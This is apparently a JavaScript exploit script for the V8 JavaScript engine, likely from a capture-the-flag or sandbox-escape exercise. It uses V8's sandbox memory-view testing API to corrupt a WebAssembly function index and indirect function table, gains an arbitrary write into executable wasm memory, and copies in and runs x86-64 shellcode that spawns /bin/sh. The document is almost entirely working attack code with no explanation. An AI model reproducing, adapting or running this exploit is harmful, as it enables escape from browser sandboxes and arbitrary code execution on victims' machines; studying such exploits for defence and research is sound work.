var sbxMemView = new Sandbox.MemoryView(0, 0xfffffff8);
var dv = new DataView(sbxMemView);

function caged_addr_of(obj) {
  return Sandbox.getAddressOf(obj);
}

function caged_read64(addr) {
  addr &= ~1;
  return dv.getBigUint64(addr, true);   
}

function caged_write64(addr, val) {
  addr &= ~1;
  dv.setBigUint64(addr, val, true);   
}

function pwn() {
  const tbl = new WebAssembly.Table({
    initial: 2,
    element: "anyfunc"
  });

  const importObject = {
    env: { jstimes3: (n) => 3 * n, },
    js: { tbl }
  };

  var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 10, 2, 96, 1, 127, 1, 127, 96, 0, 1, 127, 2, 27, 2, 3, 101, 110, 118, 8, 106, 115, 116, 105, 109, 101, 115, 51, 0, 0, 2, 106, 115, 3, 116, 98, 108, 1, 112, 0, 2, 3, 5, 4, 1, 1, 0, 0, 7, 16, 2, 6, 116, 105, 109, 101, 115, 50, 0, 3, 3, 112, 119, 110, 0, 4, 9, 8, 1, 0, 65, 0, 11, 2, 1, 2, 10, 24, 4, 4, 0, 65, 42, 11, 5, 0, 65, 211, 0, 11, 4, 0, 65, 16, 11, 6, 0, 65, 16, 16, 0, 11]);
  var module = new WebAssembly.Module(code);
  var instance = new WebAssembly.Instance(module, importObject);
  var times2 = instance.exports.times2;

  var shellcode_bytes = [49, 246, 72, 187, 47, 98, 105, 110, 47, 47, 115, 104, 86, 83, 84, 95, 106, 59, 88, 49, 210, 15, 5, 144];
  var array_buffer = new ArrayBuffer(shellcode_bytes.length);
  var byte_arr = new Uint8Array(array_buffer);
  var bigint_arr = new BigInt64Array(array_buffer);
  var shellcode = instance.exports.pwn;

  // Set the function_index of `instance.exports.times2` to 0
  var instance_addr = caged_addr_of(instance);
  var tbl_addr = caged_addr_of(tbl);
  var exported_func_addr = caged_addr_of(instance.exports.times2);
  var shared_info_ptr = Number(caged_read64(exported_func_addr + 0x8) >> 32n);
  var data = Number(caged_read64(shared_info_ptr) >> 32n);
  var instance_and_function_index = caged_read64(data + 0x10);
  var instance = instance_and_function_index & 0xFFFFFFFFn;
  caged_write64(data + 0x10, (0n << 32n) | instance);

  print("[+] instance_addr = 0x" + instance_addr.toString(16));
  print("[+] tbl_addr = 0x" + tbl_addr.toString(16));
  print("[+] exported_func_addr = 0x" + exported_func_addr.toString(16));

  var imported_function_targets_and_ift_size = caged_read64(instance_addr + 0x18);
  var imported_function_targets = imported_function_targets_and_ift_size & 0xFFFFFFFFn;
  let what_ptr = Number(imported_function_targets) + 0x8;
  var rwx = caged_read64(what_ptr);

  print("[+] imported_function_targets = 0x" + imported_function_targets.toString(16));
  print("[+] rwx = 0x" + rwx.toString(16));

  var indirect_function_tables = Number(caged_read64(instance_addr + 0xc0) >> 32n);
  var indirect_function_table = Number(caged_read64(indirect_function_tables + 0x8) & 0xFFFFFFFFn);
  var targets_ptr = indirect_function_table + 0x10;
  var where_ptr = targets_ptr;
  var targets = caged_read64(targets_ptr);
  print("[+] indirect_function_tables = 0x" + indirect_function_tables.toString(16));
  print("[+] indirect_function_table = 0x" + indirect_function_table.toString(16));

  let arbitrary_write = (where, what) => {
    caged_write64(where_ptr, where - 0x8n);
    caged_write64(what_ptr, what);
    tbl.set(1, times2);
    caged_write64(what_ptr, rwx);
    caged_write64(where_ptr, targets);
  };

  for (var i = 0; i < shellcode_bytes.length; ++i) {
    byte_arr[i] = shellcode_bytes[i];
  }

  for (var i = 0; i < shellcode_bytes.length / 8; ++i) {
    arbitrary_write(rwx + 8n * BigInt(i), bigint_arr[i]);
  }

  shellcode();
}

pwn();
